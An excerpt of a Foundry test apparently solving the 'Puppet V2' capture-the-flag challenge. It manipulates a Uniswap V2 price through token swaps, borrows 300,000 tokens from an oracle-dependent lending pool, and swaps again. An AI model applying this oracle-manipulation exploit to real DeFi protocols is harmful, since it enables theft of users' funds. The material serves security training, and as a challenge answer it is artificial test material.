...
contract PuppetV2Challenge is Test {
    ...
    function test_puppetV2() public {
        ...
        uniswapV2Router.swapExactTokensForTokens(
            PLAYER_INITIAL_TOKEN_BALANCE, 0, path, player, block.timestamp + 15 minutes
        );
        weth.approve(address(lendingPool), type(uint256).max);
        lendingPool.borrow(300000e18);
        uniswapV2Router.swapExactTokensForTokens(token.balanceOf(player), 0, path, player, block.timestamp + 15 minutes);
        ...
        console.log("BalanceOfPool", token.balanceOf(address(lendingPool)));
        weth.approve(address(uniswapV2Router), type(uint256).max);
        path = new address[](2);
        path[0] = address(weth);
        path[1] = address(token);
        uniswapV2Router.swapExactTokensForTokens(weth.balanceOf(player), 0, path, player, block.timestamp + 15 minutes);
